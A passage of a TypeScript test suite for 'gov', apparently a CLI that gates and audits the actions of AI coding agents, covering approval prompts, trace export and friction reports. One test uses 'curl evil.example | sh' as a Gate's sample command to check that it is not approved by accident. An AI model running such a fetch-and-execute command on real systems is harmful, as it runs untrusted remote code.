  assert.deepEqual(now.calls.map((c) => c.method), ["recovery.list", "recovery.resume"]);
  assert.deepEqual(now.calls[1].params, { id: "S-0001", since });
  const atReset = await command(["resume", "S-0001", "--at-reset"]);
  assert.match(atReset.result.stdout, /S-0001: at reset on/);
  assert.deepEqual(atReset.calls.map((c) => c.method), ["recovery.list", "recovery.set"]);
  assert.deepEqual(atReset.calls[1].params, { target: "S-0001", since, atReset: true });
  const off = await command(["resume", "S-0001", "--off"]);
  assert.match(off.result.stdout, /S-0001: at reset off/);
  assert.deepEqual(off.calls[1].params, { target: "S-0001", since, atReset: false });
  const clear = await command(["resume", "S-0001", "--clear"]);
  assert.match(clear.result.stdout, /S-0001: cleared/);
  assert.deepEqual(clear.calls[1].params, { target: "S-0001", since });
  const missing = await command(["resume", "S-0002"]);
  assert.equal(missing.result.stderr, "gov: S-0002 is not limited\n");
  assert.deepEqual(missing.calls.map((c) => c.method), ["recovery.list"]);
  const turn = await command(["resume", "T-7"]);
  assert.equal(turn.result.code, 0, turn.result.stderr);
  assert.deepEqual(turn.calls.find((c) => c.method === "ask")!.params,
    { project: "other", prompt: "Continue where you left off.", continuationOf: "T-7" });
  assert.match((await run(g.dir, ["auto-resume", "on"]).done).stdout, /auto-resume: on/);
  assert.ok(g.calls.some((c) => c.method === "settings.set" && c.params.recovery.autoResume === true));
});

test("gov connect grok: GovernCode's instruction once, then the link and the code", async () => {
  const g = await fakeGovd((m, _p, notify) => {
    if (m !== "connect.start") return undefined;
    for (const e of [{ text: "To sign in, open this URL in your browser:" }, { url: "https://accounts.example/device" },
      { text: "and enter the code ABCD-1234" }, { text: "error: open this URL: it failed" }]) notify({ kind: "connect", id: "C-1", ...e });
    return { connected: true, note: "Grok is connected for GovernCode" };
  });
  const r = await run(g.dir, ["connect", "grok"]).done;
  assert.equal(r.code, 0, r.stderr);
  assert.doesNotMatch(r.stdout, /To sign in, open this URL/, "the tool's own instruction is said once, by GovernCode");
  assert.match(r.stdout, /\nOpen this link, enter the code shown here and sign in; .*:\nhttps:\/\/accounts\.example\/device\nand enter the code ABCD-1234\nerror: open this URL: it failed\nGrok is connected/);
});

test("gov trace --jsonl exports every event, oldest first, a page at a time; an older govd's single page ends it", async () => {
  const all = Array.from({ length: 2500 }, (_, i) => ({ seq: i + 1, ts: "2026-09-30T00:00:00.000Z", project: null, kind: "turn.text", actor: "test", data: {} }));
  const page = (p: any) => p.after === undefined ? all.slice(-p.limit) : all.filter((e) => e.seq > p.after).slice(0, p.limit);
  const g = await fakeGovd((m, p) => (m === "project.list" ? { projects: [] } : m === "trace.list" ? { events: page(p) } : undefined));
  // Read slowly, as a pipe into a busy program is: every line still arrives before gov exits.
  const slow = run(g.dir, ["trace", "--jsonl"]);
  slow.p.stdout!.pause();
  setTimeout(() => slow.p.stdout!.resume(), 500);
  const r = await slow.done;
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(r.stdout.trimEnd().split("\n").map((l) => JSON.parse(l).seq), all.map((e) => e.seq));
  // An older govd ignores `after`: it answers its newest 1000 each time.
  const old = await fakeGovd((m, p) => (m === "project.list" ? { projects: [] } : m === "trace.list" ? { events: all.slice(-p.limit) } : undefined));
  const o = await run(old.dir, ["trace", "--jsonl"]).done;
  assert.equal(o.code, 0, o.stderr);
  assert.equal(o.stdout.trimEnd().split("\n").length, 1000);
  assert.equal(old.methods().filter((m) => m === "trace.list").length, 2);
});

test("gov friction reads only the window it reports, a page at a time, and asks govd to change nothing", async () => {
  const now = Date.now(), old = new Date(now - 30 * 86_400_000).toISOString(), recent = new Date(now - 86_400_000).toISOString();
  const all: any[] = [];
  const add = (kind: string, data: any, ts = recent, actor = "controller · claude-code") => all.push({ seq: all.length + 1, ts, project: "app", kind, actor, data });
  for (let i = 0; i < 1500; i++) add("turn.text", { text: "old" }, old);
  add("gate.opened", { gate: "G-1", tool: "Edit" }, old);
  add("gate.allowed", { gate: "G-1", tool: "Edit", by: "user" }, old);
  add("turn.started", {}); add("turn.failed", { turn: "T-1", limit: { provider: "claude-code", resetsAt: null } });
  for (let i = 0; i < 5; i++) { add("gate.opened", { gate: `G-${i + 2}`, tool: "Edit" }); add("gate.allowed", { gate: `G-${i + 2}`, tool: "Edit", by: "user" }); }
  // This Gate is from a govd that records its kind of step; the Edit ones above are from an older one.
  const step = { kinds: ["command:npm test"], always: false };
  add("gate.opened", { gate: "G-9", tool: "Bash", ...step }); add("gate.denied", { gate: "G-9", tool: "Bash", by: "nobody answered within the hour", ...step });
  add("gate.allowed", { tool: "Bash", by: "quiet read" });
  add("sandbox.refused", { reason: "bwrap missing" });
  const page = (p: any) => p.after === undefined ? all.slice(-p.limit) : all.filter((e) => e.seq > p.after).slice(0, p.limit);
  const g = await fakeGovd((m, p) => (m === "trace.list" ? { events: page(p) } : undefined));
  const r = await run(g.dir, ["friction", "--project", "app"]).done;
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual([...new Set(g.methods())], ["trace.list"], "it only reads the Trace");
  assert.ok(g.calls.every((c) => c.params.project === "app"));
  // The window's start is found one event at a time; the 1500 old events are never paged.
  assert.deepEqual(g.calls.filter((c) => c.params.limit === 1000).map((c) => c.params.after), [1502]);
  assert.match(r.stdout, /^Friction in the last 7 days, app \(read from the Trace; nothing is changed\)$/m);
  assert.match(r.stdout, /^Turns +1 started · 0 completed · 1 failed \(1 at a usage limit\)$/m);
  assert.match(r.stdout, /^Gates +6 opened \(6 by Controllers, 0 by Runners\) · 6\.0 per Controller turn$/m);
  assert.match(r.stdout, /5 allowed by you · 0 denied by you · 1 denied by govd \(1 nobody answered within the hour\)$/m);
  assert.match(r.stdout, /1 let through without a Gate \(1 quiet read\)$/m);
  assert.match(r.stdout, /^Sandbox +1 turn refused \(1 bwrap missing\)/m);
  assert.match(r.stdout, /^Edit +5 +5 +0 +0 +allowed every time$/m);
  assert.match(r.stdout, /^Bash +1 +0 +0 +1$/m);
  assert.match(r.stdout, /^Kind of step +asked +allowed +denied +by govd +let through$/m);
  assert.match(r.stdout, /^npm test +1 +0 +0 +1 +0$/m);
  assert.match(r.stdout, /^5 Gates from an older govd recorded only the tool, not the kind\.$/m);
  const j = await run(g.dir, ["friction", "--days", "60", "--json"]).done;
  assert.equal(j.code, 0, j.stderr);
  const report = JSON.parse(j.stdout);
  assert.equal(report.gates.opened, 7);
  assert.deepEqual(report.tools.find((t: any) => t.tool === "Edit"), { tool: "Edit", asked: 6, allowed: 6, denied: 0, autoDenied: 0, allowedEveryTime: true });
  const before = g.calls.length;
  for (const args of [["friction", "--days", "0"], ["friction", "--days"], ["friction", "--project", "My App"], ["friction", "extra"], ["friction", "--json", "--json"]]) {
    const bad = await run(g.dir, args).done;
    assert.equal(bad.code, 1, args.join(" "));
    assert.match(bad.stderr, /^gov: (usage: gov friction|a project name)/);
  }
  assert.equal(g.calls.length, before, "bad arguments ask govd nothing");
});

test("gov disconnect grok is accepted", async () => {
  const g = await fakeGovd((m, p) => (m === "tools.disconnect" ? { note: `${p.tool} is disconnected` } : {}));
  const r = await run(g.dir, ["disconnect", "grok"]).done;
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(g.calls.at(-1), { method: "tools.disconnect", params: { tool: "grok" } });
  assert.match(r.stdout, /grok is disconnected/);
  assert.match((await run(g.dir, ["disconnect", "gemini"]).done).stderr, /usage: gov disconnect agy\|claude\|codex\|grok/);
});

/** A govd with one project, p, in a fresh folder (gov runs inside it). */
async function withProject(handle: (method: string, params: any, notify: Notify, drop: () => void) => unknown = () => undefined,
    controller = { provider: "claude-code", model: "opus", effort: "high" }) {
  const path = mkdtempSync(join(root, "proj-"));
  const g = await fakeGovd((m, p, n, d) => handle(m, p, n, d) ?? (m === "project.list" ? { projects: [{ name: "p", path, controller }] } : {}));
  return { ...g, path };
}

test("gov controller checks the provider before anything is asked or recorded; claude means claude-code; each provider has its own defaults", async () => {
  let providers = ["claude-code"];
  const g = await withProject((m) => (m === "context.state" ? { providers, shared: {}, notes: "", specs: 0, checkpoints: 0 } : undefined));
  for (const bad of [["grok"], [], ["codex", "--effort", "extreme"], ["codex", "--model"]]) {
    const r = await run(g.dir, ["controller", ...bad], { cwd: g.path }).done;
    assert.equal(r.code, 1, bad.join(" "));
    assert.match(r.stderr, /usage: gov controller claude-code\|codex \[--model M\] \[--effort low\|medium\|high\|max\]/);
  }
  assert.deepEqual(g.methods(), [], "no question, no share answer, no change");

  const claude = await run(g.dir, ["controller", "claude"], { cwd: g.path }).done;
  assert.equal(claude.code, 0, claude.stderr);
  assert.deepEqual(g.calls.at(-1)!.params.controller, { provider: "claude-code", model: "opus", effort: "high" });
  assert.match(claude.stdout, /Controller for p: claude-code · opus · high/);

  // Piped ahead, an answer counts for nothing: it cannot see which question it would answer.
  const piped = await run(g.dir, ["controller", "codex"], { cwd: g.path, input: "y\n" }).done;
  assert.match(piped.stdout, /ignored: (no question was waiting|typed before this question was shown)/);
  assert.ok(!g.methods().includes("context.share"));

  const live = run(g.dir, ["controller", "codex"], { cwd: g.path, live: true });
  await answer(live, "Share this project's context with it? [y/N] ", "y");
  const codex = await live.done;
  assert.equal(codex.code, 0, codex.stderr);
  assert.match(codex.stdout, /Codex \(OpenAI\) will see this project's conversation/);
  assert.deepEqual(g.calls.find((c) => c.method === "context.share")!.params, { project: "p", provider: "codex", share: true });
  assert.deepEqual(g.calls.at(-1)!.params.controller, { provider: "codex", model: "gpt-5.5", effort: "medium" });
  assert.match(codex.stdout, /Controller for p: codex · gpt-5\.5 · medium/);

  providers = ["codex"];
  await run(g.dir, ["controller", "codex", "--model", "gpt-5.4", "--effort", "max"], { cwd: g.path }).done;
  assert.deepEqual(g.calls.at(-1)!.params.controller, { provider: "codex", model: "gpt-5.4", effort: "max" });
});

const tools = (claude: boolean, codex: boolean) => ({ tools: [{ tool: "claude", connected: claude }, { tool: "codex", connected: codex }] });
const NOT_ASKED = { settings: { personal: { claude: null, codex: null } } };

test("gov ask checks the connection before the personal question, and asks about Home's own Controller", async () => {
  const g = await withProject((m) => m === "tools.list" ? tools(false, true) : m === "settings.get" ? NOT_ASKED
    : m === "ask" ? Promise.reject(new Error("connect Claude Code for GovernCode first: gov connect claude")) : undefined);
  const r = await run(g.dir, ["ask", "hi"], { cwd: g.path }).done;
  assert.equal(r.code, 1);
  assert.doesNotMatch(r.stdout, /Use your own/);
  assert.match(r.stderr, /connect Claude Code for GovernCode first/);
  assert.ok(!g.methods().includes("settings.set"), "nothing recorded");

  // At Home the Controller is the one chosen last (govd says which): here Codex.
  const h = await fakeGovd((m) => m === "project.list" ? { projects: [], home: { controller: { provider: "codex", model: "gpt-5.5", effort: "medium" } } }
    : m === "tools.list" ? tools(true, true) : m === "settings.get" ? NOT_ASKED : m === "ask" ? { ok: true, summary: "done" } : undefined);
  const asking = run(h.dir, ["ask", "hi"], { live: true });
  await answer(asking, "Use your own instructions? [y/N] ", "y");
  const home = await asking.done;
  assert.equal(home.code, 0, home.stderr);
  assert.match(home.stdout, /Use your own Codex instructions in GovernCode\?/);
  assert.deepEqual(h.calls.find((c) => c.method === "settings.set")!.params.personal, { claude: null, codex: true });
});

test("gov demo makes nothing until Claude Code is connected, and says plainly when Codex is not connected", async () => {
  const now = { claude: false, codex: false, reason: "" };
  const g = await fakeGovd((m) => m === "hello" ? { sandbox: { ok: true } } : m === "tools.list" ? tools(now.claude, now.codex)
    : m === "project.list" ? { projects: [] } : m === "settings.get" ? { settings: { personal: { claude: false, codex: null } } }
    : m === "ask" ? { ok: true, summary: "done" } : m === "spec.list" ? { specs: [] }
    : m === "limits.list" ? { providers: [{ provider: "codex", verdict: { ok: false, reason: now.reason } }] } : undefined);
  const first = join(root, "demo-1");
  const r = await run(g.dir, ["demo", "--path", first]).done;
  assert.equal(r.code, 1);
  assert.match(r.stdout, /Claude Code is not connected for GovernCode yet\. Run gov connect claude, then gov demo again\./);
  assert.ok(!existsSync(first), "no folder made");
  assert.deepEqual(g.methods(), ["hello", "tools.list"], "nothing registered or asked");

  // No input: it stops at its first question, before any folder or paid turn.
  now.claude = true;
  const quiet = await run(g.dir, ["demo", "--path", first]).done;
  assert.equal(quiet.code, 1);
  assert.match(quiet.stdout, /no input here: gov demo needs you at the terminal; run it again there\./);
  assert.ok(!existsSync(first) && !g.methods().includes("ask"));

  const demo = async (path: string) => { const r = run(g.dir, ["demo", "--path", path], { live: true }); await answer(r, "Ready? [Y/n] ", ""); r.p.stdin!.end(); return r.done; };
  const d = await demo(first);
  assert.equal(d.code, 0, d.stderr);
  assert.match(d.stdout, /Skipped: Codex is not connected for GovernCode \(gov connect codex, then run the demo again\)\./);
  assert.doesNotMatch(d.stdout, /the Limit working/);
  assert.ok(!g.methods().includes("limits.list"));

  Object.assign(now, { codex: true, reason: "Codex did not report its usage (its login may need signing in again: gov connect codex) · held" });
  const held = await demo(join(root, "demo-2"));
  assert.match(held.stdout, /Skipped: Codex is held \(Codex did not report its usage/);
  assert.doesNotMatch(held.stdout, /the Limit working/);
  now.reason = "inside its 10% weekly Limit (95% used)";
  assert.match((await demo(join(root, "demo-3"))).stdout, /Codex is held \(inside its 10% weekly Limit .*\n.*the Limit working/);
});

const ANSWERS = ["gate.answer", "plan.answer", "proposal.answer", "settings.set", "context.share"];

test("with no input, gov ask leaves Gates, game plans and proposals open for another terminal, and says when one is answered there", async () => {
  let r!: ReturnType<typeof run>;
  const g = await withProject((m, _p, notify) => {
    if (m === "tools.list") return tools(true, true);
    if (m === "settings.get") return NOT_ASKED;
    if (m !== "ask") return undefined;
    return (async () => {
      notify({ kind: "gate", id: "G-1", tool: "Bash", canonical: "rm -rf dist", scopes: [] });
      notify({ kind: "plan", id: "GP-1", items: [{ who: "codex", what: "write tests" }], note: "", handoff: "ask" });
      notify({ kind: "proposal", id: "P-1", name: "x", path: "/tmp/x", git: true, reason: "" });
      // gov used to answer each at once (deny, reject, cancel); it must say where to answer instead.
      await until(() => (r.out().match(/no input here: answer from another terminal/g) ?? []).length === 3 || g.methods().some((x) => ANSWERS.includes(x)));
      notify({ kind: "trace", event: { kind: "gate.allowed", data: { gate: "G-1", tool: "Bash", by: "user" } } });
      notify({ kind: "trace", event: { kind: "plan.answered", data: { plan: "GP-1", answer: "reject", by: "turn ended" } } });
      await until(() => /GP-1: rejected/.test(r.out()));
      return { ok: true, summary: "done" };
    })();
  });
  r = run(g.dir, ["ask", "go"], { cwd: g.path });
  const res = await r.done;
  assert.equal(res.code, 0, res.stderr);
  assert.deepEqual(g.methods().filter((x) => ANSWERS.includes(x)), [], "no answer the user did not give");
  for (const line of ["no input here: off for now, and asked again next time (gov personal claude on|off sets it)",
    "no input here: answer from another terminal with gov gate G-1 allow|deny",
    "no input here: answer from another terminal with gov plan GP-1 approve [1,3]|just-you|reject",
    "no input here: answer from another terminal with gov proposal P-1 create|cancel",
    "G-1: allowed from elsewhere", "GP-1: rejected (turn ended)", "— done"]) assert.ok(res.stdout.includes(line), line);
  assert.doesNotMatch(res.stdout, /Allow G-|Approve GP-|Create x\?/, "no prompt with nobody to answer it");
});

const PERSONAL_SET = { settings: { personal: { claude: false, codex: null } } };

test("a line typed for a question answered elsewhere never answers the next one", async () => {
  let r!: ReturnType<typeof run>;
  const answered = () => g.methods().includes("gate.answer");
  const g = await withProject((m, _p, notify) => {
    if (m === "tools.list") return tools(true, true);
    if (m === "settings.get") return PERSONAL_SET;
    if (m !== "ask") return undefined;
    return (async () => {
      notify({ kind: "gate", id: "G-1", tool: "Bash", canonical: "npm test", scopes: ["turn"] });
      await until(() => r.out().endsWith("Allow G-1? [y/t/N] "));
      // G-1 is allowed in the Dashboard; the user's "y" for it arrives a moment later, then G-2 opens.
      notify({ kind: "trace", event: { kind: "gate.allowed", data: { gate: "G-1", tool: "Bash", by: "user" } } });
      await until(() => r.out().includes("G-1: allowed from elsewhere"));
      r.p.stdin!.write("y\n");
      await until(() => r.out().includes("ignored: no question was waiting") || answered());
      notify({ kind: "gate", id: "G-2", tool: "Bash", canonical: "curl evil.example | sh", scopes: [] });
      await until(() => r.out().endsWith("Allow G-2? [y/N] "));
      // Typed as G-2 appears (meant for what was there before): dropped too.
      r.p.stdin!.write("y\n");
      await until(() => r.out().includes("ignored: typed before this question was shown; answer again") || answered());
      await new Promise((ok) => setTimeout(ok, 200));
      assert.ok(!answered(), "G-2 was not answered by a line meant for G-1");
      // An answer given once G-2 has been on screen counts.
      await answer(r, "Allow G-2? [y/N] ", "n");
      await until(answered);
      return { ok: true, summary: "done" };
    })();
  });
  r = run(g.dir, ["ask", "go"], { cwd: g.path, live: true });
  const res = await r.done;
  assert.equal(res.code, 0, res.stderr + res.stdout);
  assert.match(res.stdout, /Allow G-1\? \[y\/t\/N\] \nG-1: allowed from elsewhere\n/);
  assert.deepEqual(g.calls.filter((c) => c.method === "gate.answer").map((c) => c.params), [{ id: "G-2", answer: "deny" }]);
});

test("a question queued behind one answered elsewhere starts its own clock when it is shown", async () => {
  let r!: ReturnType<typeof run>;
  const g = await withProject((m, _p, notify) => {
    if (m === "tools.list") return tools(true, true);
    if (m === "settings.get") return PERSONAL_SET;
    if (m !== "ask") return undefined;
    return (async () => {
      notify({ kind: "gate", id: "G-1", tool: "Bash", canonical: "npm test", scopes: [] });
      notify({ kind: "gate", id: "G-2", tool: "Bash", canonical: "rm -rf build", scopes: [] });
      await until(() => r.out().includes("Allow G-1? [y/N] ") && r.out().endsWith("rm -rf build\n"));
      await new Promise((ok) => setTimeout(ok, 1100));
      notify({ kind: "trace", event: { kind: "gate.allowed", data: { gate: "G-1", tool: "Bash", by: "user" } } });
      await until(() => r.out().endsWith("Allow G-2? [y/N] "));
      r.p.stdin!.write("y\n");   // typed for G-1, which had been on screen a while
      await until(() => r.out().includes("ignored: typed before this question was shown"));
      return { ok: true, summary: "done" };
    })();
  });
  r = run(g.dir, ["ask", "go"], { cwd: g.path, live: true });
  const res = await r.done;
  assert.equal(res.code, 0, res.stderr);
  assert.match(res.stdout, /G-1: allowed from elsewhere\nAllow G-2\? \[y\/N\] /);
  assert.ok(!g.methods().includes("gate.answer"));
});

test("gov exits 1 when govd closes the connection mid-turn", async () => {
  const g = await withProject((m, _p, _n, drop) => (m === "tools.list" ? tools(true, true) : m === "settings.get" ? PERSONAL_SET
    : m === "ask" ? new Promise(() => drop()) : undefined));
  const r = await run(g.dir, ["ask", "go"], { cwd: g.path }).done;
  assert.equal(r.code, 1);
  assert.match(r.stderr, /gov: govd closed the connection/);
});

test("at Home a proposal's question stays after the turn; one answered elsewhere is withdrawn", async () => {
  const home = (onAsk: (notify: Notify) => Promise<unknown>) => fakeGovd((m, _p, notify) => m === "project.list" ? { projects: [] }
    : m === "tools.list" ? tools(true, true) : m === "settings.get" ? PERSONAL_SET : m === "ask" ? onAsk(notify)
    : m === "proposal.answer" ? { created: { name: "reader", path: "/tmp/reader" } } : undefined);
  const proposed = (notify: Notify) => notify({ kind: "proposal", id: "P-1", name: "reader", path: "/tmp/reader", git: true, reason: "" });
  // The Controller proposes and its turn ends at once; the question is shown again below and answered.
  const g = await home(async (notify) => { proposed(notify); notify({ kind: "text", text: "I proposed reader." }); return { ok: true, summary: "done" }; });
  const r = run(g.dir, ["ask", "start a reader"], { live: true });
  await answer(r, "I proposed reader.\n\nCreate reader? [y/N] ", "y");
  const res = await r.done;
  assert.equal(res.code, 0, res.stderr);
  assert.deepEqual(g.calls.find((c) => c.method === "proposal.answer")!.params, { id: "P-1", answer: "create" });
  assert.match(res.stdout, /created reader at \/tmp\/reader \(cd there to work in it\)\n.*— done/);

  // Created from another terminal after the turn: withdrawn here, and gov ends.
  const h = await home(async (notify) => {
    proposed(notify);
    setTimeout(() => notify({ kind: "trace", event: { kind: "project.created", project: "reader", data: { path: "/tmp/reader", proposal: "P-1" } } }), 300);
    return { ok: true, summary: "done" };
  });
  const res2 = await run(h.dir, ["ask", "start a reader"], { live: true }).done;
  assert.equal(res2.code, 0, res2.stderr);
  assert.match(res2.stdout, /P-1: created from elsewhere/);
  assert.ok(!h.methods().includes("proposal.answer"));
});

test("an inline plan answer outside the plan is asked again, not sent", async () => {
  let r!: ReturnType<typeof run>;
  const g = await withProject((m, _p, notify) => {
    if (m === "tools.list") return tools(true, true);
    if (m === "settings.get") return PERSONAL_SET;
    if (m !== "ask") return m === "plan.answer" ? { ok: true, approved: [1] } : undefined;
    return (async () => {
      notify({ kind: "plan", id: "GP-1", items: [{ who: "codex", what: "write tests" }], note: "", handoff: "ask" });
      const prompt = "Approve GP-1? [y = all / 1,3 = only those / j = just you / N] ";
      await answer(r, prompt, "0");
      await until(() => r.out().includes("the items are 1 to 1"));
      await answer(r, prompt, "1");
      await until(() => g.methods().includes("plan.answer"));
      return { ok: true, summary: "done" };
    })();
  });
  r = run(g.dir, ["ask", "go"], { cwd: g.path, live: true });
  const res = await r.done;
  assert.equal(res.code, 0, res.stderr);
  assert.deepEqual(g.calls.filter((c) => c.method === "plan.answer").map((c) => c.params), [{ id: "GP-1", answer: "approve", items: [1] }]);
});

test("gov plan and gov proposal answer from another terminal", async () => {
  const g = await fakeGovd((m, p) => (m === "proposal.answer" ? { created: p.answer === "create" ? { name: "x", path: "/tmp/x" } : null }
    : m === "plan.answer" ? { ok: true, approved: p.answer === "approve" ? p.items ?? [1, 2, 3] : [] } : {}));
  const some = await run(g.dir, ["plan", "GP-3", "approve", "1,3"]).done;
  assert.equal(some.code, 0, some.stderr);
  assert.match(some.stdout, /GP-3: approved: items 1, 3/, "what govd approved");
  assert.match((await run(g.dir, ["plan", "GP-3", "just-you"]).done).stdout, /GP-3: just you/);
  for (const bad of [["reject", "1"], ["approve", "1", "3"]]) {
    assert.match((await run(g.dir, ["plan", "GP-3", ...bad]).done).stderr, /usage: gov plan GP-N approve \[1,3\]\|just-you\|reject/, bad.join(" "));
  }
  assert.match((await run(g.dir, ["proposal", "P-2", "create"]).done).stdout, /created x at \/tmp\/x \(cd there to work in it\)/);
  assert.match((await run(g.dir, ["proposal", "P-2", "maybe"]).done).stderr, /usage: gov proposal P-N create\|cancel/);
  assert.deepEqual(g.calls.map((c) => [c.method, c.params]), [["plan.answer", { id: "GP-3", answer: "approve", items: [1, 3] }],
    ["plan.answer", { id: "GP-3", answer: "just-you" }], ["proposal.answer", { id: "P-2", answer: "create" }]]);
});

test("with no input, gov controller records no share answer: the new Controller starts fresh", async () => {
  const g = await withProject((m) => (m === "context.state" ? { providers: ["claude-code"], shared: {}, notes: "", specs: 0, checkpoints: 0 } : undefined));
  const r = await run(g.dir, ["controller", "codex"], { cwd: g.path }).done;
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /no input here: nothing is shared, so it starts fresh/);
  assert.deepEqual(g.methods(), ["project.list", "context.state", "controller.set"]);
});
